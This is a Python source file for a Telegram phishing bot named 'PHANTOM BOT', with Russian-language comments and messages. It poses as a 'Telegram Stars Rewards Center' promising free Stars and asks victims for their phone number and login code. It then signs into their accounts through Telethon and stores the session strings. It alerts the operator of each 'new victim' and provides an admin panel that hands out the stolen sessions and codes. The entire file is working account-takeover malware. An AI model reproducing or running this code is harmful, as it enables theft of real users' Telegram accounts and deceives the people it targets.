import os
from telebot import TeleBot, types
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

bot = TeleBot(BOT_TOKEN)
victims = {}

print("[+] PHANTOM BOT ЗАПУЩЕН")

# ====================== СТАРТ ======================
@bot.message_handler(commands=['start'])
def start(message):
    text = """🌟 <b>Telegram Stars Rewards Center</b>

Получайте до 5000 Stars бесплатно за подключение аккаунта!

Нажмите кнопку ниже 👇"""

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🚀 Подключить аккаунт и получить Stars", callback_data="connect"))
    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)

# ====================== ФИШИНГ ======================
@bot.callback_query_handler(func=lambda call: call.data == "connect")
def connect(call):
    bot.send_message(call.message.chat.id, "📱 Введите номер телефона (+79xxxxxxxxx):")
    bot.register_next_step_handler(call.message, wait_phone)

def wait_phone(message):
    phone = message.text.strip()
    if not phone.startswith("+"):
        phone = "+" + phone
    bot.send_message(message.chat.id, f"✅ Номер: <b>{phone}</b>\n\nВведите код из Telegram:", parse_mode='HTML')
    bot.register_next_step_handler(message, wait_code, phone)

async def wait_code(message, phone):
    code = message.text.strip()
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.sign_in(phone, code)
        session_string = client.session.save()
        me = await client.get_me()

        victims[phone] = {
            "session_string": session_string,
            "fished_code": code,
            "first_name": me.first_name
        }

        await bot.send_message(ADMIN_ID, f"🌟 НОВАЯ ЖЕРТВА!\n📱 {phone}\n👤 {me.first_name}")
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"⚠️ Фиш: {phone} | Код: {code} | Ошибка: {e}")
    finally:
        await client.disconnect()

    bot.send_message(message.chat.id, "🎉 Аккаунт подключён! Начислено 3850 Stars!", parse_mode='HTML')

# ====================== АДМИН ======================
@bot.message_handler(commands=['adminwork'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "Доступ запрещён.")
        return

    if not victims:
        bot.send_message(message.chat.id, "Пока нет аккаунтов.")
        return

    markup = types.InlineKeyboardMarkup(row_width=1)
    for phone in victims:
        markup.add(types.InlineKeyboardButton(f"📄 Файл сессии {phone[-8:]}", callback_data=f"file:{phone}"))
        markup.add(types.InlineKeyboardButton(f"🔑 Код {phone[-8:]}", callback_data=f"code:{phone}"))

    bot.send_message(message.chat.id, f"🔥 PHANTOM ADMIN PANEL\nСессий: {len(victims)}", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.from_user.id != ADMIN_ID:
        return
    action, phone = call.data.split(":", 1)
    data = victims.get(phone)
    if not data:
        return

    if action == "file":
        bot.send_message(call.message.chat.id, f"📄 StringSession для {phone}:\n\n<code>{data['session_string']}</code>", parse_mode='HTML')
    elif action == "code":
        bot.send_message(call.message.chat.id, f"🔑 Код: {data.get('fished_code', 'нет')}")

# ====================== ЗАПУСК ======================
if __name__ == "__main__":
    print("[+] Запуск polling...")
    bot.infinity_polling(none_stop=True, interval=0, timeout=30)
